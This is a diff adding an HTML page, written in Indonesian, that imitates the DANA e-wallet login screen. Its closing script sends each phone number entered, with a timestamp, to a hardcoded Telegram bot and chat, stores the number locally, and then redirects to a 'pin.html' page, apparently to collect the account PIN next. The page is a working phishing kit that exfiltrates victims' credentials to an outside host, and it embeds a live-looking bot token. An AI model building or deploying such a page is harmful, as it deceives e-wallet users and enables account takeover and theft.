@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title> Login</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    -webkit-tap-highlight-color:transparent;
+}
+
+html,body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    font-family:'Nunito',sans-serif;
+    background:#1296ea;
+}
+
+body{
+    display:flex;
+    justify-content:center;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    height:100vh;
+    background:#1296ea;
+    position:relative;
+    overflow:hidden;
+}
+
+/* HEADER */
+
+.header{
+    width:100%;
+    position:relative;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding-top:20px;
+}
+
+.back{
+    position:absolute;
+    left:22px;
+    top:24px;
+    width:14px;
+    height:14px;
+    border-left:3px solid #dff2ff;
+    border-bottom:3px solid #dff2ff;
+    transform:rotate(45deg);
+    border-radius:2px;
+}
+
+.logo{
+    display:flex;
+    align-items:center;
+    gap:8px;
+}
+
+.logo-img{
+    width:35px;
+    height:35px;
+    object-fit:contain;
+    display:block;
+}
+
+.logo-text{
+    color:#fff;
+    font-size:25px;
+    font-weight:700;
+    letter-spacing:4px;
+}
+
+/* CONTENT */
+
+.content{
+    padding:46px 24px 0;
+}
+
+.title{
+    text-align:center;
+    color:#dff1fc;
+    font-size:19px;
+    line-height:20px;
+    font-weight:500;
+}
+
+.title b{
+    color:#fff;
+    font-weight:800;
+}
+
+/* FORM */
+
+.form-area{
+    margin-top:34px;
+}
+
+.label-row{
+    display:flex;
+    gap:16px;
+    margin-bottom:8px;
+}
+
+.label{
+    color:#dff1fc;
+    font-size:15px;
+    font-weight:600;
+}
+
+.label:first-child{
+    width:90px;
+}
+
+.input-row{
+    display:flex;
+    gap:14px;
+}
+
+.country-box{
+    width:90px;
+    height:52px;
+    background:#f4f4f4;
+    border-radius:14px;
+    border:2px solid #d8d8d8;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+}
+
+.flag{
+    width:22px;
+    height:16px;
+    border-radius:2px;
+    overflow:hidden;
+}
+
+.flag .red{
+    height:50%;
+    background:#e70011;
+}
+
+.flag .white{
+    height:50%;
+    background:#fff;
+}
+
+.code{
+    font-size:15px;
+    font-weight:700;
+    color:#000;
+}
+
+.number-box{
+    flex:1;
+    height:52px;
+    background:#f4f4f4;
+    border-radius:14px;
+    border:2px solid #d8d8d8;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 14px 0 18px;
+}
+
+.number-input{
+    width:100%;
+    height:100%;
+    border:none;
+    outline:none;
+    background:transparent;
+    color:#000;
+    font-size:20px;
+    font-weight:700;
+    font-family:'Nunito',sans-serif;
+}
+
+.number-input::placeholder{
+    color:#c8ccd2;
+    font-weight:800;
+}
+
+.clear{
+    width:22px;
+    height:22px;
+    background:#cfcfcf;
+    border-radius:50%;
+    color:#fff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:15px;
+    font-weight:800;
+    cursor:pointer;
+    user-select:none;
+}
+
+/* DESCRIPTION */
+
+.desc{
+    margin-top:20px;
+    text-align:center;
+    color:#dff1fc;
+    font-size:17px;
+    line-height:28px;
+    font-weight:500;
+}
+
+.desc b{
+    color:#fff;
+    font-weight:800;
+}
+
+/* LOCATION BOX */
+
+.location-box{
+    margin-top:24px;
+    width:100%;
+    height:78px;
+    background:#0c81cb;
+    border-radius:16px;
+    display:flex;
+    align-items:center;
+    gap:14px;
+    padding:0 16px;
+}
+
+.location-icon{
+    width:34px;
+    height:34px;
+    position:relative;
+}
+
+.location-icon:before{
+    content:"";
+    position:absolute;
+    width:24px;
+    height:24px;
+    background:#fff;
+    border-radius:50% 50% 50% 0;
+    transform:rotate(-45deg);
+    left:4px;
+    top:2px;
+}
+
+.location-icon:after{
+    content:"";
+    position:absolute;
+    width:8px;
+    height:8px;
+    background:#0c81cb;
+    border-radius:50%;
+    left:12px;
+    top:10px;
+}
+
+.location-text{
+    color:#fff;
+    font-size:14px;
+    line-height:22px;
+    font-weight:600;
+}
+
+/* BUTTON */
+
+.bottom{
+    position:absolute;
+    left:0;
+    bottom:32px;
+    width:100%;
+    padding:0 18px;
+}
+
+.button{
+    width:100%;
+    height:52px;
+    border:none;
+    border-radius:14px;
+    background:#f3f3f3;
+    color:#1296ea;
+    font-size:18px;
+    font-weight:800;
+    letter-spacing:1px;
+    font-family:'Nunito',sans-serif;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="header">
+        <div class="back"></div>
+        <div class="logo">
+            <img src="logo.jpg" class="logo-img">
+            <div class="logo-text">DANA</div>
+        </div>
+    </div>
+
+    <div class="content">
+        <div class="title">
+            Masukkan <b>nomor HP</b> kamu untuk lanjut
+        </div>
+
+        <div class="form-area">
+            <div class="label-row">
+                <div class="label">Negara</div>
+                <div class="label">Nomor</div>
+            </div>
+
+            <div class="input-row">
+                <div class="country-box">
+                    <div class="flag">
+                        <div class="red"></div>
+                        <div class="white"></div>
+                    </div>
+                    <div class="code">+62</div>
+                </div>
+
+                <div class="number-box">
+                    <input 
+                        type="tel"
+                        class="number-input"
+                        placeholder="811-1234-5678"
+                    >
+                    <div class="clear">×</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="desc">
+            Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.<br>
+            Dengan melanjutkan, kamu juga setuju dengan <b>S&K</b> serta <b>Kebijakan Privasi</b> kami.
+        </div>
+
+        <div class="location-box">
+            <div class="location-icon"></div>
+            <div class="location-text">
+                Yuk aktifkan akses lokasi untuk pakai semua fitur!
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom">
+        <button class="button">LANJUTKAN</button>
+    </div>
+
+</div>
+
+<script>
+// KONFIGURASI TELEGRAM
+const BOT_TOKEN = "7109004796:AAGU8FvieH2HkNADWvD5HMUAkXid_jb6_1w"; // Ganti Token Bot kamu
+const CHAT_ID = "5983910858"; // Ganti Chat ID kamu
+
+const input = document.querySelector('.number-input');
+
+input.addEventListener('input', function(){
+    // hanya angka
+    this.value = this.value.replace(/[^0-9]/g,'');
+
+    // wajib diawali 8
+    if(this.value.length === 1 && this.value !== '8'){
+        this.value = '8';
+    }
+
+    // maksimal 12 digit
+    if(this.value.length > 12){
+        this.value = this.value.slice(0,12);
+    }
+});
+
+// Fungsi kirim ke Telegram
+async function kirimKeTelegram(nomorHp) {
+    const pesan = `📩 Data Login DANA\n📱 Nomor: +62${nomorHp}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`;
+    await fetch(url);
+}
+
+document.querySelector('.button').addEventListener('click', async function(){
+    const nomor = input.value;
+
+    if(nomor.length < 10){
+        alert('Masukkan nomor valid');
+        return;
+    }
+
+    // 1. Simpan data ke LocalStorage (bisa diambil di halaman lain)
+    localStorage.setItem("nomor_hp", "+62" + nomor);
+    localStorage.setItem("waktu_masuk", new Date().toLocaleString('id-ID'));
+
+    // 2. Kirim data ke Telegram
+    await kirimKeTelegram(nomor);
+
+    // 3. Pindah ke halaman selanjutnya
+    window.location.href = "pin.html";
+});
+
+document.querySelector('.clear').addEventListener('click', function(){
+    input.value = '';
+    input.focus();
+});
+</script>
+
+</body>
+</html>
